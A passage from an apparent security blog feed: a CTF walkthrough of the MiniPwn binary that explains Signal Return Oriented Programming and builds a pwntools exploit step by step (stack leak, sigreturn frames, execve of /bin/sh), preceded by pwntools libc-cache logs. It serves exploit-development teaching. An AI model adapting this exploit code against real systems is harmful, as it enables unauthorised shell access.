<pre><code class="language-log" data-lang="log">[DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f
[+] Downloading 'https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f': 70B

[DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/libc/libc6_2.27-3ubuntu1_amd64/lib/x86_64-linux-gnu/libc-2.27.so
[+] Downloading 'https://gitlab.com/libcdb/libcdb/raw/master/libc/libc6_2.27-3ubuntu1_amd64/lib/x86_64-linux-gnu/libc-2.27.so': 1.94MB
</code></pre><p>Second run:</p>
<pre><code class="language-log" data-lang="log">[DEBUG] Found existing cached libc at '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
[*] Using cached data from '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
</code></pre><p>That's all for today's Pwntools quick tips!</p>
]]></content>
        </item>
        
        <item>
            <title>Abusing Signals with SIGROP Exploits</title>
            <link>https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/</link>
            <pubDate>Sat, 28 Dec 2019 21:59:34 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/</guid>
            <description>TMHC: MiniPwn Walk-through This one&#39;s just as much for me as it is for you. They say you don&#39;t truly understand something until you&#39;re able to teach it to someone else. So here we go!
The Many Hats Club had a CTF on HackTheBox a few weekends ago that re-ignited a previous passion for exploit development. The reason it got me interested was that it required a new exploit technique of which I&#39;d not yet heard, Signal Return Oriented Programming.</description>
            <content type="html"><![CDATA[<p><img src="1.png" alt=""></p>
<h1 id="tmhc-minipwn-walkthrough">TMHC: MiniPwn Walk-through</h1>
<p>This one's just as much for me as it is for you. They say you don't truly understand something until
you're able to teach it to someone else. So here we go!</p>
<p>The Many Hats Club had a CTF on HackTheBox a few weekends ago that re-ignited a previous passion for
exploit development. The reason it got me interested was that it required a new exploit technique
of which I'd not yet heard, Signal Return Oriented Programming. Check out
<a href="https://pdfs.semanticscholar.org/5c48/3c22bf9a761d6b900b6acdbad72b321f39ee.pdf">this whitepaper</a></p>
<h2 id="whats-sropsigrop">What's SROP/SIGROP?</h2>
<p>Basically, if you can control the Accumulator Register (AX) and reach a SYSCALL instruction,
you can send a SIGRET signal to the process. You can read more about
<a href="http://man7.org/linux/man-pages/man7/signal.7.html">Signals here.</a>
When a process receives a SIGRET signal, it takes the current stack frame and writes it to the
registers. If you're controlling the stack, then you can ostensibly create your own set of registers
in a manner that places you in a more advantageous position during your exploit.</p>
<h2 id="the-challenge">The Challenge</h2>
<p>The challenge was a very small binary, hand written in assembly. The stack was not executable (NX),
and even if you had gadgets, there's nowhere all that useful to jump.</p>
<p>Here's the <code>strace</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ strace ./pwn
execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./pwn&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;./pwn&#34;</span><span style="color:#f92672">]</span>, 0x7ffcfe4a4a50 /* <span style="color:#ae81ff">57</span> vars */<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
read<span style="color:#f92672">(</span>0, AAAAAAA
<span style="color:#e6db74">&#34;AAAAAAA\n&#34;</span>, 300<span style="color:#f92672">)</span>               <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
write<span style="color:#f92672">(</span>1, <span style="color:#e6db74">&#34;AAAAAAA\n&#34;</span>, 8AAAAAAA
<span style="color:#f92672">)</span>                <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                 <span style="color:#f92672">=</span> ?
</code></pre></div><p>So it just echos back what we type at it.</p>
<p>Here's the complete assembly (with comments by me):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">
_start:           <span style="color:#75715e">; 0x400000</span>
<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x40101e</span>   <span style="color:#75715e">; push _write</span>
<span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x0</span>    <span style="color:#75715e">; 1st arg to the upcoming syscall. read from FD 0, STDIN</span>
<span style="color:#a6e22e">mov</span>    rsi,rsp    <span style="color:#75715e">; copy stack pointer to RSI, the 2nd argument for the upcoming syscall</span>
<span style="color:#a6e22e">sub</span>    rsi,<span style="color:#ae81ff">0x8</span>    <span style="color:#75715e">; subtract 0x8 from where the stack starts; the buffer will be 8 bytes</span>
<span style="color:#a6e22e">mov</span>    edx,<span style="color:#ae81ff">0x12c</span>  <span style="color:#75715e">; use 300 as the 3rd argument to the upcoming read syscall, count</span>
<span style="color:#a6e22e">mov</span>    eax,<span style="color:#ae81ff">0x0</span>    <span style="color:#75715e">; set the first argument to 0, which is sys_READ</span>
<span style="color:#a6e22e">syscall</span>           <span style="color:#75715e">; get user input; IMPORTANT: return value (input length) goes to RAX</span>
<span style="color:#a6e22e">ret</span>                                                                                               
                                                                                                  
_write:           <span style="color:#75715e">; 0x40101e</span>
<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x40103c</span>   <span style="color:#75715e">; push _exit</span>
<span style="color:#a6e22e">mov</span>    rsi,rsp    <span style="color:#75715e">; 2nd arg, buffer location</span>
<span style="color:#a6e22e">sub</span>    rsi,<span style="color:#ae81ff">0x8</span>    <span style="color:#75715e">; move back 8 bytes</span>
<span style="color:#a6e22e">mov</span>    edx,<span style="color:#ae81ff">0x8</span>    <span style="color:#75715e">; how much data to write, 8 bytes</span>
<span style="color:#a6e22e">mov</span>    eax,<span style="color:#ae81ff">0x1</span>    <span style="color:#75715e">; which syscall to run; 1 = sys_WRITE</span>
<span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x1</span>    <span style="color:#75715e">; which descriptor to write to; 1 = STDOUT</span>
<span style="color:#a6e22e">syscall</span>           <span style="color:#75715e">; write buffer to stdout</span>
<span style="color:#a6e22e">ret</span>                                                                                               
                                                                                                  
_exit:            <span style="color:#75715e">; 0x40103c</span>
<span style="color:#a6e22e">mov</span>    eax,<span style="color:#ae81ff">0x3c</span>   <span style="color:#75715e">; 60; exit syscall</span>
<span style="color:#a6e22e">syscall</span>           <span style="color:#75715e">; exit</span>
</code></pre></div><p>That's it.</p>
<p>So let's get into an overview of what our solution is going to entail. The first thing to know is
that our buffer is 8 bytes. We can determine that by either looking at the assembly or with the
traditional pattern create/query. We'll also need know the binary's security measures. The remote
box has ASLR enabled, which we would have found later; we'll proceed with that as a given.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; checksec
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/terrance/Dropbox/Blogs/security/content/post/minipwn/pwn/pwn&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</code></pre></div><p>We can take two paths from here. We can SIGROP an mprotect syscall to re-enable execution on the
stack. Doing so would enable execution of shellcode from the stack again, defeating NX. Or we can
SIGROP to the execve syscall and spawn <code>/bin/sh</code>. Mprotect is the easier path, and is the intended
solution. It wasn't the path I initially took.</p>
<p>Being the glutton for punishment that I am, let's continue with the execve syscall route.</p>
<p>The return value from <code>SYS_read</code> is the size of bytes read and is stored at <code>RAX</code>. <code>RAX</code> also
happens to be where the <code>syscall</code> instruction looks to see which syscall function it should be
running. <code>SYS_sigreturn</code> is syscall 15 according to
<a href="https://filippo.io/linux-syscall-table/">this handy syscall table.</a></p>
<p>Here's our plan:</p>
<ol>
<li>Overwrite the stack and force an address leak.
<ul>
<li>Calculate some consistent known offset since ASLR is on.</li>
</ul>
</li>
<li>Restart the program without quitting, setting it back to a vulnerable state</li>
<li>Overwrite again, this time setting up a read <code>SYS_sigreturn</code>
<ul>
<li>Since we can hand-write the stack frame that ends up in the registers, we'll set <code>$RSP</code> to our
known offset. Additionally, we'll set up a <code>SYS_read</code> in the frame so we can continue sending the
binary some more data.</li>
</ul>
</li>
<li>Set up  our buffer for more control flow and add another SIGRET frame, this time for <code>SYS_execve</code></li>
<li>Trigger the SIGRET by sending 15 bytes</li>
<li>Maybe shell</li>
</ol>
<h2 id="the-exploit">The Exploit</h2>
<p>I took the opportunity, as a supplemental exercise, to also get very familiar with the <code>pwntools</code>
exploit-writing library for Python. I'll be trying to use as few &lsquo;magic&rsquo; numbers as possible and
use the library to its fullest potential.</p>
<p>This is the skeleton I'm going to start with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys

BIN <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./pwn</span><span style="color:#e6db74">&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">setup_pipe</span>(gdb_commands):
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
        log<span style="color:#f92672">.</span>error(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Run mode missing: [debug, local, remote &lt;server&gt; &lt;port&gt;]</span><span style="color:#e6db74">&#34;</span>)

    context<span style="color:#f92672">.</span>clear(
        arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>,
        terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">splitw</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-h</span><span style="color:#e6db74">&#34;</span>]
    )

    opt <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">if</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#34;</span>:
        context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#34;</span>,
        io <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug(BIN, gdb_commands)
    <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">remote</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
        HOST, PORT <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]
        io <span style="color:#f92672">=</span> remote(HOST, PORT)
    <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">local</span><span style="color:#e6db74">&#34;</span>:
        io <span style="color:#f92672">=</span> process(BIN)
    <span style="color:#66d9ef">else</span>:
        log<span style="color:#f92672">.</span>error(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Run mode missing: [debug, local, remote &lt;server&gt; &lt;port&gt;]</span><span style="color:#e6db74">&#34;</span>)

    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Run mode: {}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(opt))
    <span style="color:#66d9ef">return</span> io

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#34;</span>:

    commands <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">    b _start</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">    </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
    elf, rop <span style="color:#f92672">=</span> ELF(BIN), ROP(BIN)
    io  <span style="color:#f92672">=</span> setup_pipe(commands)

    <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">    EXPLOIT CODE GOES HERE</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">    </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>We can start by declaring some constants that we'll need for the exploit. Let's get some info first:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass _start
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> _start:
   0x0000000000401000 &lt;+0&gt;:     push   0x40101e
   0x0000000000401005 &lt;+5&gt;:     mov    edi,0x0
   0x000000000040100a &lt;+10&gt;:    mov    rsi,rsp
   0x000000000040100d &lt;+13&gt;:    sub    rsi,0x8
   0x0000000000401011 &lt;+17&gt;:    mov    edx,0x12c
   0x0000000000401016 &lt;+22&gt;:    mov    eax,0x0
   0x000000000040101b &lt;+27&gt;:    syscall
   0x000000000040101d &lt;+29&gt;:    ret

pwndbg&gt; disass _write
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> _write:
   0x000000000040101e &lt;+0&gt;:     push   0x40103c
   0x0000000000401023 &lt;+5&gt;:     mov    rsi,rsp
   0x0000000000401026 &lt;+8&gt;:     sub    rsi,0x8
   0x000000000040102a &lt;+12&gt;:    mov    edx,0x8
   0x000000000040102f &lt;+17&gt;:    mov    eax,0x1
   0x0000000000401034 &lt;+22&gt;:    mov    edi,0x1
   0x0000000000401039 &lt;+27&gt;:    syscall
   0x000000000040103b &lt;+29&gt;:    ret
</code></pre></div><p>From here, we generate our address constants:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">syscall   <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">27</span> <span style="color:#75715e"># 0x401016</span>
ret2read  <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">22</span> <span style="color:#75715e"># 0x401016</span>
ret2write <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_write <span style="color:#f92672">+</span> <span style="color:#ae81ff">17</span> <span style="color:#75715e"># 0x40102f</span>
_start    <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>  <span style="color:#75715e"># we want to skip pushing _write to the stack</span>

OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
SIGRET_FRAME_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">248</span>
SLEEP <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</code></pre></div><p>Building our first overwrite of the stack:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Overflow the next two return addresses:</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">First, ret to (mov eax,0x1) to cause a write syscall. Doing this</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">makes execution skip the part of _write that sets the output length</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">to just 8. This makes it print the 0x12c bytes set at 401011,</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">causing pointer leaks</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Next, ret to _start+5 to skip pushing _write at 0x401000. This also</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">sets up the binary to begin listening again with an 8 byte buffer,</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">putting it back into an overflowable/vulnerable state.</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Sending initial payload to leak pointers</span><span style="color:#e6db74">&#34;</span>)
data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> OFFSET
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(ret2write) <span style="color:#75715e"># Leak pointers</span>
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(_start)    <span style="color:#75715e"># Reset</span>
p<span style="color:#f92672">.</span>send(data)
</code></pre></div><p>Now we deal with the data that we've forced the application to echo back to us:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">The 4th giant-word is an environment variable pointer.</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&amp;</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> it with 0xfffffffffffff000 to find the beginning of the page.</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">This is our new, known base/offset that remains consistent between</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">runs, even with ASLR</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
leaks <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()
pointer <span style="color:#f92672">=</span> leaks[<span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
stack_leak <span style="color:#f92672">=</span> u64(pointer) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
log<span style="color:#f92672">.</span>warn(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">leaked stack: </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(stack_leak))
</code></pre></div><p>We can create a function that will generate us our SIGRET frame to keep the code a little cleaner:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Build a SIGRETURN SYS_read frame that reads 2000 bytes.</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sigreturn_read</span>(read_location):
    frame <span style="color:#f92672">=</span> SigreturnFrame()
    frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_read
    frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>STDIN_FILENO
    frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> read_location
    frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000</span>
    frame<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> read_location
    frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
    <span style="color:#66d9ef">return</span> bytes(frame)

<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Overflow again thanks to the SYS_read we setup from the 1st payload</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">First, reset binary to into a read state.  To this read, we will</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">soon pass 15 bytes to manipulate RAX (read return value of # bytes read)</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Next, ret to a syscall to trigger the SIGRETURN</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Also, send the SIGRETURN Frame </span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Sending stage 2 which seeds the first SIGRETURN frame</span><span style="color:#e6db74">&#34;</span>)
pause(SLEEP)
data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> OFFSET
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(ret2read)
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(syscall)
data <span style="color:#f92672">+</span><span style="color:#f92672">=</span> sigreturn_read(stack_leak)
p<span style="color:#f92672">.</span>send(data)
</code></pre></div><p>Now we trigger the SIGRET by sending 15 bytes (remember the SIGRET number is 15 and the return
value of <code>SYS_read</code> is the number of bytes read, and this return value gets stored in RAX)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Trigger SIGRETURN by sending 15 bytes to the binary when it</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">reading, which sets RAX to 15. When execution meets a syscall</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">instruction, the frame above will replace all the register values</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Triggering the first SIGRETURN by sending 15 junk bytes</span><span style="color:#e6db74">&#34;</span>)
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> constants<span style="color:#f92672">.</span>SYS_rt_sigreturn)
</code></pre></div><p>The SIGRET frame we built earlier has now been pulled into the registers.</p>
<pre><code>rax = 0 # SYS_read
rdi = 0 # STDIN File Descriptor
rsi = our calculated page-start address
rdx = 2000 # arg to sys_READ for how many bytes to read
rsp = our calculated page-start address
rip = our syscall address
</code></pre><p>Execution continues to a <code>syscall</code> instruction, because that's where we set RIP in our frame. Given
our now known stack-base, we can now build out our own stack and track our own offsets. We'll set
up another SYS_read which will read 15 bytes to set RAX and then ret to a syscall to trigger the
SIGRETURN. We can calculate where the end of the payload (previous 2 instruction plus our custom
stack frame) will be. Once triggered, <code>/bin/sh</code> will be at RSP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Build a SYS_execve SIGRETURN frame that will execute /bin/sh</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">The binsh address in the stack will eventually hold </span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">followed by a pointer to null, followed by a pointer to binsh</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">pointer, in order to satisfy execve</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s second argument, and array</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">of args, hence the +16</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">execve(*program, *args{program, null}, null)</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sigreturn_execve</span>(binsh_addr):
    frame <span style="color:#f92672">=</span> SigreturnFrame()
    frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_execve
    frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> binsh_addr
    frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> binsh_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>
    frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
    <span style="color:#66d9ef">return</span> frame


binsh <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>

payload  <span style="color:#f92672">=</span> p64(ret2read)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(syscall)

end_of_payload <span style="color:#f92672">=</span> stack_leak <span style="color:#f92672">+</span> len(payload) <span style="color:#f92672">+</span> SIGRET_FRAME_SIZE <span style="color:#f92672">+</span> len(binsh)

frame <span style="color:#f92672">=</span> sigreturn_execve(end_of_payload)
frame<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> end_of_payload
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> bytes(frame)
<span style="color:#75715e"># ^ &#39;end_of_payload&#39;</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> binsh
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(end_of_payload)

<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Reset to vuln state</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload</span><span style="color:#e6db74">&#34;</span>)
p<span style="color:#f92672">.</span>send(p64(ret2read))
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> OFFSET <span style="color:#f92672">+</span> payload)

